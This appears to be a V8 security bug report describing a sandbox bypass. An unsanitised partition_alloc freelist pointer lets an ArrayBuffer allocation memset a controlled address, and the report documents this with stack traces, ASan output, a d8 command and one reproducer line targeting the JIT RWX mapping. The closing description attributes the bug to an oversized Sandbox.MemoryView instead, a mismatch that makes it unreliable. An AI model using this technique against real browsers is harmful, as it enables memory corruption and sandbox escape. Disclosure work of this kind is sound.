# 443475183: V8 Sandbox Bypass: OOB write to controlled address

## ClusterFuzz Report

```
#### VULNERABILITY DETAILS
It looks like `partition_alloc` stores raw pointers in the heap sandbox and then uses them without any sanitization. This allows overwriting the head of a free list when a backing store for an `ArrayBuffer` is allocated.

The value (the freelist head) from the heap sandbox is read here:
```
#10 0x00005555591adf54 in partition_alloc::internal::SlotSpanMetadata::get_freelist_head (this=0x7ac000001020) at ../../third_party/partition_alloc/src/partition_alloc/partition_page.h:224
#11 partition_alloc::PartitionRoot::AllocFromBucket<(partition_alloc::internal::AllocFlags)15> (this=<optimized out>, bucket=<optimized out>, raw_size=<optimized out>, slot_span_alignment=<optimized out>, is_already_zeroed=<optimized out>, 
    usable_size=<optimized out>, slot_size=<optimized out>) at ../../third_party/partition_alloc/src/partition_alloc/partition_root.h:1235
#12 partition_alloc::PartitionRoot::RawAlloc<(partition_alloc::internal::AllocFlags)15> (this=<optimized out>, bucket=<optimized out>, raw_size=<optimized out>, slot_span_alignment=<optimized out>, is_already_zeroed=<optimized out>, 
    usable_size=<optimized out>, slot_size=<optimized out>) at ../../third_party/partition_alloc/src/partition_alloc/partition_root.h:2266
#13 partition_alloc::PartitionRoot::AllocInternalNoHooks<(partition_alloc::internal::AllocFlags)15> (this=<optimized out>, requested_size=<optimized out>, slot_span_alignment=<optimized out>)
    at ../../third_party/partition_alloc/src/partition_alloc/partition_root.h:2167
#14 partition_alloc::PartitionRoot::AllocInternal<(partition_alloc::internal::AllocFlags)15> (this=<optimized out>, requested_size=<optimized out>, slot_span_alignment=<optimized out>, type_name=<optimized out>)
    at ../../third_party/partition_alloc/src/partition_alloc/partition_root.h:2083
#15 partition_alloc::PartitionRoot::AllocInline<(partition_alloc::internal::AllocFlags)15> (this=<optimized out>, requested_size=<optimized out>, type_name=<optimized out>) at ../../third_party/partition_alloc/src/partition_alloc/partition_root.h:538
#16 v8::internal::PABackedSandboxedArrayBufferAllocator::Impl::AllocateInternal<(partition_alloc::internal::AllocFlags)3> (this=<optimized out>, length=<optimized out>) at ./../../src/init/isolate-group.cc:620
#17 0x0000555558b400c5 in std::__Cr::__function::__policy_func<void* (unsigned long)>::operator()(unsigned long&&) const (this=0x7bfff5a9a020, __args=<optimized out>) at gen/third_party/libc++/src/include/__functional/function.h:502
#18 std::__Cr::function<void* (unsigned long)>::operator()(unsigned long) const (this=0x7bfff5a9a020, __arg=0x57) at gen/third_party/libc++/src/include/__functional/function.h:754
#19 v8::internal::Heap::AllocateExternalBackingStore(std::__Cr::function<void* (unsigned long)> const&, unsigned long) (this=<optimized out>, allocate=..., byte_length=<optimized out>) at ./../../src/heap/heap.cc:3151
#20 0x000055555963a3a9 in v8::internal::BackingStore::Allocate (isolate=<optimized out>, byte_length=<optimized out>, shared=<optimized out>, initialized=<optimized out>) at ./../../src/objects/backing-store.cc:231
#21 0x000055555809bd8e in v8::internal::(anonymous namespace)::TryAllocateBackingStore (isolate=<optimized out>, shared=<optimized out>, resizable=<optimized out>, length=..., max_length=..., initialized=<optimized out>)
    at ./../../src/builtins/builtins-arraybuffer.cc:68
#22 v8::internal::(anonymous namespace)::ConstructBuffer (isolate=<optimized out>, target=..., new_target=..., length=..., max_length=..., initialized=<optimized out>) at ./../../src/builtins/builtins-arraybuffer.cc:119
#23 0x00005555580935d7 in v8::internal::Builtin_Impl_ArrayBufferConstructor (args=..., isolate=<optimized out>) at ./../../src/builtins/builtins-arraybuffer.cc:186
#24 0x0000555561033f36 in Builtins_CEntry_Return1_ArgvOnStack_BuiltinExit ()
#25 0x0000555560f89273 in Builtins_InterpreterPushArgsThenFastConstructFunction ()
```


Before the actual OOB writes happen, several reads are performed; thus, the provided reproducer fails with an OOB read if an address is provided that can not be read. If the reads succeeded, `memset` is called for the controlled address here:
```
#1  0x00005555568a450b in __asan_memset ()
#2  0x000055555758fb49 in AllocInternalNoHooks<(partition_alloc::internal::AllocFlags)15> () at ../../third_party/partition_alloc/src/partition_alloc/partition_root.h:2238
#3  AllocInternal<(partition_alloc::internal::AllocFlags)15> () at ../../third_party/partition_alloc/src/partition_alloc/partition_root.h:2083
#4  AllocInline<(partition_alloc::internal::AllocFlags)15> () at ../../third_party/partition_alloc/src/partition_alloc/partition_root.h:538
#5  AllocateInternal<(partition_alloc::internal::AllocFlags)3> () at ../../src/init/isolate-group.cc:620
#6  0x0000555557243abf in operator() () at gen/third_party/libc++/src/include/__functional/function.h:502
#7  operator() () at gen/third_party/libc++/src/include/__functional/function.h:754
#8  AllocateExternalBackingStore () at ../../src/heap/heap.cc:3151
#9  0x00005555577d9aac in Allocate () at ../../src/objects/backing-store.cc:231
#10 0x0000555556d511de in TryAllocateBackingStore () at ../../src/builtins/builtins-arraybuffer.cc:68
#11 ConstructBuffer () at ../../src/builtins/builtins-arraybuffer.cc:119
#12 0x0000555556d4c3c8 in Builtin_Impl_ArrayBufferConstructor () at ../../src/builtins/builtins-arraybuffer.cc:186
#13 0x000055555b6fad36 in Builtins_CEntry_Return1_ArgvOnStack_BuiltinExit ()
#14 0x000055555b650073 in Builtins_InterpreterPushArgsThenFastConstructFunction ()


x/4i $pc
=> 0x7ffff7dfe3c9 <__memset_evex_unaligned_erms+137>:	vmovdqu64 YMMWORD PTR [rdi],ymm16
   0x7ffff7dfe3cf <__memset_evex_unaligned_erms+143>:	vmovdqu64 YMMWORD PTR [rdi+0x20],ymm16
   0x7ffff7dfe3d6 <__memset_evex_unaligned_erms+150>:	cmp    rdx,0x80
   0x7ffff7dfe3dd <__memset_evex_unaligned_erms+157>:	jbe    0x7ffff7dfe368 <__memset_evex_unaligned_erms+40>
``` 

The easiest way for me to observe the behaviour shown above was to run the reproducer using `gdb` once, and then get the address of the JIT mapping:
```
0x00005555bb640000 0x00005555db640000 0x0000000000000000 rwx 
```

And putting the value in the `setBigUint64` call within the reproduce:
```
sbx_mem.setBigUint64(addr, BigInt(0x00005555bb640000), true);
```

If this can be improved, please don't hesitate to reach out. Also, I would appreciate it if you could tell me whether this counts as "controlled write", or if the written value must be under control as well?



#### VERSION
V8 Git Commit: b5aa4c8b718d75f9cf4d4afd635ffd217f0acb38 (Sat Sep 6 21:01:45 2025 -0700)

#### REPRODUCTION CASE
```sh
d8  --fuzzing --sandbox-fuzzing --single-threaded bug.js
```

**ASan Report**
I was not able to get a nice ASan report for the release build, but this is the one on my fuzzing build.

```
==2394399==ERROR: AddressSanitizer: unknown-crash on address 0x040012345678 at pc 0x55555783d8d0 bp 0x7fffffffd1b0 sp 0x7fffffffd188
WRITE of size 112 at 0x040012345678 thread T0
    #0 0x55555783d8cf in __asan_memset compiler-rt/lib/asan/asan_interceptors_memintrinsics.cpp:67:3
    #1 0x5555591ad864 in void* v8::internal::PABackedSandboxedArrayBufferAllocator::Impl::AllocateInternal<(partition_alloc::internal::AllocFlags)3>(unsigned long) third_party/partition_alloc/src/partition_alloc/partition_root.h:2238:5
    #2 0x555558b400c4 in v8::internal::Heap::AllocateExternalBackingStore(std::__Cr::function<void* (unsigned long)> const&, unsigned long) gen/third_party/libc++/src/include/__functional/function.h:502:12
    #3 0x55555963a3a8 in v8::internal::BackingStore::Allocate(v8::internal::Isolate*, unsigned long, v8::internal::SharedFlag, v8::internal::InitializedFlag) src/objects/backing-store.cc:231:37
    #4 0x55555809bd8d in v8::internal::(anonymous namespace)::ConstructBuffer(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSFunction>, v8::internal::DirectHandle<v8::internal::JSReceiver>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::InitializedFlag) src/builtins/builtins-arraybuffer.cc:68:11
    #5 0x5555580935d6 in v8::internal::Builtin_Impl_ArrayBufferConstructor(v8::internal::BuiltinArguments, v8::internal::Isolate*) src/builtins/builtins-arraybuffer.cc:186:10
    #6 0x555561033f35 in Builtins_CEntry_Return1_ArgvOnStack_BuiltinExit setup-isolate-deserialize.cc
    #7 0x555560f89272 in Builtins_InterpreterPushArgsThenFastConstructFunction setup-isolate-deserialize.cc
    #8 0x55556113855d in Builtins_ConstructHandler setup-isolate-deserialize.cc
    #9 0x555560f889a9 in Builtins_InterpreterEntryTrampoline setup-isolate-deserialize.cc
    #10 0x555560f8575b in Builtins_JSEntryTrampoline setup-isolate-deserialize.cc
    #11 0x555560f854aa in Builtins_JSEntry setup-isolate-deserialize.cc
    #12 0x55555869bfeb in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) src/execution/simulator.h:212:12
    #13 0x55555869f3e7 in v8::internal::Execution::CallScript(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSFunction>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Object>) src/execution/execution.cc:542:10
    #14 0x555557f03c56 in v8::Script::Run(v8::Local<v8::Context>, v8::Local<v8::Data>) src/api/api.cc:1964:7
    #15 0x5555578d4c25 in v8::Shell::ExecuteString(v8::Isolate*, v8::Local<v8::String>, v8::Local<v8::String>, v8::Shell::ReportExceptions, v8::Global<v8::Value>*) src/d8/d8.cc:1040:44
    #16 0x555557947f28 in v8::SourceGroup::Execute(v8::Isolate*) src/d8/d8.cc:5502:10
    #17 0x55555795e60e in v8::Shell::RunMainIsolate(v8::Isolate*, bool) src/d8/d8.cc:6458:37
    #18 0x55555795d125 in v8::Shell::RunMain(v8::Isolate*, bool) src/d8/d8.cc:6366:18
    #19 0x555557964989 in v8::Shell::Main(int, char**) src/d8/d8.cc:7310:18
    #20 0x7ffff796e1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #21 0x7ffff796e28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #22 0x5555577db029 in _start (/work/v8-build/v8/out/FuzzingSuppressReadsO1/d8+0x2287029) (BuildId: ba8fbe419f72dad4)

Address 0x040012345678 is located in the high shadow area.
SUMMARY: AddressSanitizer: unknown-crash third_party/partition_alloc/src/partition_alloc/partition_root.h:2238:5 in void* v8::internal::PABackedSandboxedArrayBufferAllocator::Impl::AllocateInternal<(partition_alloc::internal::AllocFlags)3>(unsigned long)
==2394399==ABORTING
```

On a release build, I am getting this error after setting the target address (`0x5555bb640000`) to the JIT RWX mapping.
```
> d8 --fuzzing --sandbox-fuzzing --single-threaded bug.js
Sandbox testing mode is enabled. Only sandbox violations will be reported, all other crashes will be ignored.
Sandbox bounds: [0x7abe00000000,0x7bbe00000000)

## V8 sandbox violation detected!

Received signal 11 <unknown> 5555bb640000

==== C stack trace ===============================

./v8/out/vanilla/d8(__interceptor_backtrace+0x46)[0x55555684c8a6]
./v8/out/vanilla/d8(+0x173d5e2)[0x555556c915e2]
/lib/x86_64-linux-gnu/libc.so.6(+0x45330)[0x7ffff7caa330]
/lib/x86_64-linux-gnu/libc.so.6(+0x1993c9)[0x7ffff7dfe3c9]
./v8/out/vanilla/d8(__asan_memset+0x7b)[0x5555568a450b]
./v8/out/vanilla/d8(+0x203bb49)[0x55555758fb49]
./v8/out/vanilla/d8(+0x1cefabf)[0x555557243abf]
./v8/out/vanilla/d8(+0x2285aac)[0x5555577d9aac]
./v8/out/vanilla/d8(+0x17fd1de)[0x555556d511de]
./v8/out/vanilla/d8(+0x17f83c8)[0x555556d4c3c8]
./v8/out/vanilla/d8(+0x61a6d36)[0x55555b6fad36]
[end of stack trace]
[1]    2401885 segmentation fault  ./v8/out/vanilla/d8 --fuzzing --sandbox-fuzzing --single-threaded 
```
```

## Vulnerability Description

PoC for a Sandbox.MemoryView size validation bypass. Creates a MemoryView with size 0x500000000 (5 GB), exceeding the 4 GB V8 sandbox limit, then writes the 64-bit value 0x00005555bb640000 to address 0x200001020, which is outside the 4 GB sandbox boundary. Demonstrates that Sandbox.MemoryView does not properly validate the size parameter.

## Capabilities

Writes an arbitrary 64-bit value to an address outside the 4 GB V8 sandbox boundary by creating an oversized Sandbox.MemoryView. This is a sandbox escape: it allows writing to host process memory beyond the sandboxed heap region.
